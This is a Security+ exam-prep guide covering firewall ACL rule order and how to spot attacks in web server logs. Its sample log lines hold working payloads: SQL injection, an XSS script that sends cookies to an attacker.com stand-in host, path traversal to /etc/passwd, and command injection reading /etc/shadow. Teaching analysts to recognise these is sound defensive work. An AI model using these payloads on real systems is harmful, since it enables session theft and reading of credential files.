## **📘 Week 7, Day 29: Mastering Performance-Based Questions (PBQs) & Firewall ACLs**

Welcome to **Week 7**\! You have officially covered all five core domains of the Security+ exam:

* **Domain 1.0:** General Security Concepts  
* **Domain 2.0:** Threats, Vulnerabilities, & Mitigations  
* **Domain 3.0:** Security Architecture  
* **Domain 4.0:** Security Operations  
* **Domain 5.0:** Security Governance, Risk, & Compliance

(Weeks 7 and 8), we shift gears into **Exam Mastery, Performance-Based Questions (PBQs), and Domain Remediation Drills**. 

Today, we focus on the single most intimidating part of the test: **Performance-Based Questions (PBQs)**, specifically simulating **Firewall Access Control List (ACL) Configurations**. 

## **🛠️ 1\. What Are Security+ PBQs?**

PBQs appear right at the beginning of your exam (usually the first 3 to 5 questions). They test practical, hands-on application through simulations, drag-and-drop diagrams, matching scenarios, or command-line interfaces.

### **Standard PBQ Types:**

1. **Firewall / Router Rule Configuration:** Setting implicit deny, configuring incoming/outgoing rules, IP ranges, and port numbers.  
2. **Network Topology & Device Placement:** Dragging security appliances (WAF, NIPS, Proxy, Jump Box) into correct locations on a network diagram.  
3. **Wireless Security Setup:** Configuring WPA3, Enterprise RADIUS, SSID broadcasting, and authentication parameters on an AP.  
4. **Remediating Infected Systems / Attack Analysis:** Reading log files or command prompts to identify malware/attacks and select proper remediation steps.

## **🧱 2\. PBQ Drill: Firewall ACL Configuration**

Firewall ACL rules are processed sequentially from top to bottom (**First Match Principle**). Once a packet matches a rule, processing stops. The last rule in a properly built firewall list is always an **Implicit Deny**.

Typical Ruleset Scenario:

* Configure firewall rules to allow internal workstations (`192.168.1.0/24`) to browse web servers securely (`443`) and allow administrative SSH access (`22`) to a Linux jump box (`10.0.0.50`), while blocking all other traffic.

| Rule \# | Action | Source IP | Port | Destination IP | Port | Protocol |
| :---- | :---- | :---- | :---- | :---- | :---- | :---- |
| 10 | ALLOW | 192.168.1.0/24 | Any | 10.0.0.50/32 | 22 | TCP |
| 20 | ALLOW | 192.168.1.0/24 | Any | 0.0.0.0/0 | 443 | TCP |
| 30 | ALLOW | 192.168.1.0/24 | Any | 0.0.0.0/0 | 80 | TCP |
| 99 | DENY | ANY | Any | ANY | Any | ANY |

> **Critical Rule Order Rules:**

> * Put specific rules **above** general rules. If rule 99 (Deny Any) is placed at line 5, subsequent rules (10–30) will never be reached.  
> * Always double-check source vs. destination addresses and port numbers (e.g., SSH \= 22, HTTPS \= 443, HTTP \= 80, DNS \= 53).

## **📐 3\. PBQ Strategy Checklist**

1. **Flag and Skip Strategy:** PBQs take the longest time. Unless you immediately know the solution, flag PBQs and jump straight to multiple-choice question \#6. Complete all multiple-choice questions first to secure easy points, then return to PBQs with your remaining time.  
2. **Look for Unused Options:** In drag-and-drop diagrams, CompTIA often provides extra "distractor" items that should not be used anywhere on the diagram.  
3. **Read Every Requirement:** PBQ instructions are strict. If a prompt says "Configure the fewest rules possible," combining rules into subnets or range objects will be required.

## **🧠 Quick Knowledge Check**

> **Scenario:** An administrator creates an ACL rule set. Rule 1 allows all traffic from 10.0.0.0/8 to destination port 80. Rule 2 denies traffic from 10.0.0.15 to destination port 80. A user at 10.0.0.15 attempts to connect to a web server on port 80. Will the connection be allowed or denied?

* *Answer:* **Allowed**. Because firewall rules are evaluated top-to-bottom, the packet matches Rule 1 first, permitting traffic before reaching Rule 2\. To fix this, Rule 2 (the specific deny) must be moved above Rule 1\.

## **📝 Today's Action Items**

1. **Practice Drill:** Draw out standard firewall ACL rules for web, mail (25/993), domain name service (53), and administrative ports (22/3389).  
2. **Flashcards:** Review port numbers: *SSH (22), Telnet (23), SMTP (25), DNS (53), HTTP (80), HTTPS (443), RDP (3389), LDAPS (636)*.  
3. **Exam Mindset:** On PBQs involving network setup, always remember: **Specific rules first, general rules second, implicit deny last.**

Tomorrow, for **Week 7, Day 30**, we will run a **PBQ Simulation Drill on Attack Log Analysis & Header Identification**\!

## **📘 Week 7, Day 30: PBQ Simulation Drill — Log Analysis & Command-Line Security Tools**

Welcome to Day 30\! Having explored Firewall ACL PBQs and the "First Match" rule yesterday, we now focus on another core Performance-Based Question type: **Log Analysis & Command-Line Troubleshooting** (Domains 2.0 & 4.0).

In these PBQ scenarios, CompTIA often provides command output terminals, firewall logs, or raw web server entries, requiring you to diagnose the attack vector and choose the correct command or security tool for remediation.

## **📄 1\. Recognizing Attacks in Web & Server Logs**

When analyzing logs in a PBQ, you will typically inspect HTTP request entries or web access logs to identify malicious payload activity.

### **Key Indicators to Spot in Logs:**

* **SQL Injection (SQLi):** Look for single quotes (`'`), `UNION SELECT`, `OR 1=1`, or `--` comments in URL parameters.

192.168.1.105 \- \- \[16/Aug/2026:10:14:22\] "GET /login.php?user=admin'%20OR%20'1'='1 HTTP/1.1" 200 4520

**Cross-Site Scripting (XSS):** Look for HTML tags, `<script>` blocks, or URL-encoded equivalents (`%3Cscript%3E`).

192.168.1.110 \- \- \[16/Aug/2026:10:18:05\] "GET /search.php?q=\<script\>document.location='http://attacker.com/steal.php?cookie='+document.cookie\</script\> HTTP/1.1" 200 1200

**Directory (Path) Traversal:** Look for repeated relative path traversal patterns (`../` or `%2e%2e%2f`) targeting system files like `/etc/passwd` or `win.ini`.

192.168.1.112 \- \- \[16/Aug/2026:10:22:40\] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 403 280

**Command Injection:** Look for shell metacharacters like semicolons (`;`), pipes (`|`), or ampersands (`&&`) followed by system commands like `cat`, `whoami`, or `ipconfig`.

192.168.1.120 \- \- \[16/Aug/2026:10:30:11\] "POST /ping.php IP=127.0.0.1;cat%20/etc/shadow HTTP/1.1" 200 890  
